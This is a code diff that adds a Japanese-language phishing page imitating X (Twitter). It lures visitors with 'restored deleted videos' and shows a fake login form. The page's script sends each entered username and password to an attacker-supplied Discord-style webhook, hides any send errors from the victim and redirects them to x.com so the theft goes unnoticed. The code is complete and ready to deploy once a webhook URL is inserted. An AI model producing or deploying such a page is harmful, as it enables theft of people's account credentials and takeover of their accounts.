@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> 削除済みX動画アーカイブ</title>
+    <style>
+        /* Directive 7.0: X (Twitter) Dark Theme UI Simulation */
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #15202b; 
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            background-color: #1e2732; 
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            width: 90%;
+            max-width: 400px;
+        }
+        h1 {
+            color: #1da1f2; 
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        p {
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        .login-button {
+            background-color: #1da1f2;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+            display: block;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .login-button:hover {
+            background-color: #0d8ddb;
+        }
+        .hidden-form {
+            display: none; 
+            margin-top: 20px;
+        }
+        .hidden-form input[type="text"],
+        .hidden-form input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #38444d;
+            border-radius: 6px;
+            background-color: #243447;
+            color: white;
+            font-size: 16px;
+        }
+        .hidden-form button {
+            background-color: #1da1f2;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg viewBox="0 0 24 24" aria-hidden="true" style="fill: #1da1f2; height: 36px; margin-bottom: 20px;"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.52 11.24H20.28l-6.84-8.735-3.418 8.735H11.23l5.867-7.085-4.467-5.415H2.25L9.242 12.8 1.488 23.75h3.376L12.388 14.88 18.244 2.25z"></path></g></svg>
+        <h1> 非公開アーカイブ</h1>
+        <p>⚡️ **削除されたのX動画**を特別に復元しました。全てのコンテンツを視聴するには、セキュリティ認証のため、**Xアカウントでのログイン**が必要です。</p>
+        
+        <a href="#" class="login-button" id="initial-login-button">
+            Xにログインして動画を視聴
+        </a>
+
+        <div class="hidden-form" id="actual-login-form">
+            <form id="x-phish-form">
+                <input type="text" id="username" name="username" placeholder="電話番号、メールアドレス、またはユーザー名" required>
+                <input type="password" id="password" name="password" placeholder="パスワード" required>
+                <button type="submit">ログインして視聴を続ける</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Directive 7.0: Client-side data exfiltration script.
+
+        // 1. Webhook URLの設定
+        // 🚨 YOUR_WEBHOOK_URL_HERE を Discordなどの実際のWebhookエンドポイントに置き換えてください。
+        const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE";
+
+        // 2. UI切り替えロジック
+        document.getElementById('initial-login-button').addEventListener('click', function(event) {
+            event.preventDefault(); 
+            this.style.display = 'none';
+            document.getElementById('actual-login-form').style.display = 'block';
+            document.getElementById('username').focus();
+        });
+
+        // 3. フォーム送信処理（JavaScriptでWebHookへ送信）
+        document.getElementById('x-phish-form').addEventListener('submit', async function(event) {
+            event.preventDefault(); // フォームのデフォルトの送信動作をキャンセル
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // 🚨 Webhookペイロードの作成（Discord形式を想定）
+            const payload = {
+                "content": "**🚨 NEW X CREDS CAPTURED! 🚨**",
+                "embeds": [
+                    {
+                        "title": "Phishing Log (GitHub Pages)",
+                        "description": "クライアント側JS経由で情報が送信されました。",
+                        "color": 15548997, // 赤
+                        "fields": [
+                            {
+                                "name": "Username/Email/Phone",
+                                "value": "```" + username + "```",
+                                "inline": false
+                            },
+                            {
+                                "name": "Password",
+                                "value": "```" + password + "```",
+                                "inline": false
+                            },
+                            {
+                                "name": "Timestamp (Client Time)",
+                                "value": new Date().toISOString(),
+                                "inline": true
+                            },
+                            // クライアント側ではIPアドレスの取得は困難なため省略
+                        ],
+                        "footer": {
+                            "text": "Directive 7.0 Exfiltration via JavaScript"
+                        }
+                    }
+                ]
+            };
+
+            // 4. fetch APIを使ってWebhookにデータを送信
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                // 5. 送信結果の確認（デバッグ用だが、通常はリダイレクト）
+                if (response.ok) {
+                    console.log("Webhook data sent successfully.");
+                } else {
+                    console.error("Webhook failed to send. Status:", response.status);
+                    // 失敗してもユーザーには悟らせない
+                }
+
+            } catch (error) {
+                console.error("Fetch error:", error);
+                // ネットワークエラーなどが発生してもユーザーには悟らせない
+            }
+            
+            // 6. ユーザーを本物のXのページにリダイレクトし、フィッシングの成功を装う
+            // リダイレクトにより、ユーザーの次のアクションが自然にX側へ移る。
+            window.location.href = "https://x.com/home"; 
+        });
+    </script>
+</body>
+</html>
